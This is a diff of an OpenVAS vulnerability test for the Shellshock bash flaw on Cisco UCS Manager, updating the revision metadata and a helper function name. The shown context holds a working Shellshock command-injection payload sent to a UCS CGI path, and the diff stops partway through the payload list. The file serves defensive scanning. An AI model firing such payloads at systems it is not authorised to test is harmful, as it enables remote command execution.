@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_cisco_ucs_shellshock.nasl 11008 2018-08-16 13:26:16Z cfischer $
+# $Id: gb_cisco_ucs_shellshock.nasl 13659 2019-02-14 08:34:21Z cfischer $
 #
 # Cisco UCS GNU Bash Environment Variable Command Injection Vulnerability (Shellshock)
 #
@@ -33,14 +33,14 @@ if(description)
   script_cve_id("CVE-2014-6278");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_version("$Revision: 11008 $");
+  script_version("$Revision: 13659 $");
 
   script_name("Cisco UCS GNU Bash Environment Variable Command Injection Vulnerability (Shellshock)");
 
   script_xref(name:"URL", value:"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20140926-bash");
   script_xref(name:"URL", value:"https://bst.cloudapps.cisco.com/bugsearch/bug/CSCur01379");
 
-  script_tag(name:"last_modification", value:"$Date: 2018-08-16 15:26:16 +0200 (Thu, 16 Aug 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
   script_tag(name:"creation_date", value:"2016-03-17 09:25:23 +0100 (Thu, 17 Mar 2016)");
   script_category(ACT_ATTACK);
   script_family("CISCO");
@@ -73,7 +73,7 @@ include("http_keepalive.inc");
 if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
 
 url = '/ucsm/isSamInstalled.cgi';
-useragent = get_http_user_agent();
+useragent = http_get_user_agent();
 host = http_host_name( port:port );
 
 attacks = make_list(  '() { OpenVAS:; }; echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id;',
